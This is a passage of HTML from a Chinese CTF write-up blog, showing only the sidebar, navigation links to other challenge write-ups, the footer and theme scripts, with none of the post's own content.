title="[GKCTF_2021]babycat-revenge">[GKCTF_2021]babycat-revenge</a></li><li><a href="/2025/03/13/%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B%EF%BC%9F/" rel="bookmark" title="谁赢了比赛？">谁赢了比赛？</a></li><li><a href="/2025/03/13/%E6%A2%85%E8%8A%B1%E9%A6%99%E8%87%AA%E8%8B%A6%E5%AF%92%E6%9D%A5/" rel="bookmark" title="梅花香自苦寒来">梅花香自苦寒来</a></li><li><a href="/2025/03/13/ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-outguess/" rel="bookmark" title="[ACTF新生赛2020]outguess">[ACTF新生赛2020]outguess</a></li><li><a href="/2025/03/16/NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-R-C-E/" rel="bookmark" title="[NewStarCTF-2023-公开赛道]R!!!C!!!E!!!">[NewStarCTF-2023-公开赛道]R!!!C!!!E!!!</a></li><li><a href="/2025/03/18/JMCTF-2021-GoOSS/" rel="bookmark" title="[JMCTF_2021]GoOSS">[JMCTF_2021]GoOSS</a></li>
        </ul>
      </div>
      <div class="overview panel" data-title="Overview">
        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <img class="image" itemprop="image" alt="odiws"
      data-src="/images/avatar.jpg">
  <p class="name" itemprop="name">odiws</p>
  <div class="description" itemprop="description"></div>
</div>

<nav class="state">
    <div class="item posts">
      <a href="/archives/">
        <span class="count">113</span>
        <span class="name">posts</span>
      </a>
    </div>
    <div class="item categories">
      <a href="/categories/">
        <span class="count">11</span>
        <span class="name">categories</span>
      </a>
    </div>
    <div class="item tags">
      <a href="/tags/">
        <span class="count">102</span>
        <span class="name">tags</span>
      </a>
    </div>
</nav>

<div class="social">
</div>

<ul class="menu">
  
    
  <li class="item">
    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
  </li>


</ul>

      </div>
    </div>
  </div>

  <ul id="quick">
    <li class="prev pjax">
        <a href="/2024/11/05/WMCTF2020-Web-Check-in-2-0/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
    </li>
    <li class="up"><i class="ic i-arrow-up"></i></li>
    <li class="down"><i class="ic i-arrow-down"></i></li>
    <li class="next pjax">
        <a href="/2024/11/08/HarekazeCTF2019-Sqlite-Voting/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
    </li>
    <li class="percent"></li>
  </ul>
</div>


        </div>
        <div class="dimmer"></div>
      </div>
    </main>
    <footer id="footer">
      <div class="inner">
        <div class="widgets">
          
<div class="rpost pjax">
  <h2>Random Posts</h2>
  <ul>
      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
</div>

    <span><a href="/2024/09/27/watevrCTF-2019-PickleStore/" title="[watevrCTF-2019]PickleStore">[watevrCTF-2019]PickleStore</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
</div>

    <span><a href="/2024/09/26/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-Blackcat/" title="[羊城杯2020]Blackcat">[羊城杯2020]Blackcat</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="In 学习笔记">学习笔记</a>
</div>

    <span><a href="/2025/02/19/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="java反序列化学习笔记">java反序列化学习笔记</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
<i class="ic i-angle-right"></i>
<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/misc/" title="In misc">misc</a>
</div>

    <span><a href="/2024/12/04/%E5%88%B7%E6%96%B0%E8%BF%87%E7%9A%84%E5%9B%BE%E7%89%87/" title="刷新过的图片">刷新过的图片</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
</div>

    <span><a href="/2024/11/14/NPUCTF2020-webdog/" title="NPUCTF2020webdog">NPUCTF2020webdog</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
</div>

    <span><a href="/2024/09/24/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-Easyphp2/" title="[羊城杯2020]Easyphp2">[羊城杯2020]Easyphp2</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
</div>

    <span><a href="/2024/12/10/De1CTF-2019-Giftbox/" title="[De1CTF_2019]Giftbox">[De1CTF_2019]Giftbox</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
</div>

    <span><a href="/2024/11/03/CISCN2021Quals-upload/" title="[CISCN2021Quals]upload">[CISCN2021Quals]upload</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
</div>

    <span><a href="/2024/10/15/CSAWQual2016-i-got-id/" title="[CSAWQual2016]i_got_id">[CSAWQual2016]i_got_id</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
</div>

    <span><a href="/2024/11/22/HMGCTF2022-Smarty-Calculator/" title="[HMGCTF2022]Smarty-Calculator">[HMGCTF2022]Smarty-Calculator</a></span>
  </li>

  </ul>
</div>
<div>
  <h2>Recent Comments</h2>
  <ul class="leancloud-recent-comment"></ul>
</div>

        </div>
        <div class="status">
  <div class="copyright">
    
    &copy; 2010 – 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="ic i-sakura rotate"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">odiws @ zty153’s_blog</span>
  </div>
  <div class="powered-by">
    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
  </div>
</div>

      </div>
    </footer>
  </div>
<script data-config type="text/javascript">
  var LOCAL = {
    path: '2024/11/07/蓝帽杯-2021-One-Pointer-PHP/',
    favicon: {
      show: "（●´3｀●）Goooood",
      hide: "(´Д｀)Booooom"
    },
    search : {
      placeholder: "Search for Posts",
      empty: "We didn't find any results for the search: ${query}",
      stats: "${hits} results found in ${time} ms"
    },
    valine: true,fancybox: true,
    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
    ignores : [
      function(uri) {
        return uri.includes('#');
      },
      function(uri) {
        return new RegExp(LOCAL.path+"$").test(uri);
      }
    ]
  };
</script>

<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>

<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>

<script src="/js/app.js?v=0.2.5"></script>




</body>
</html>
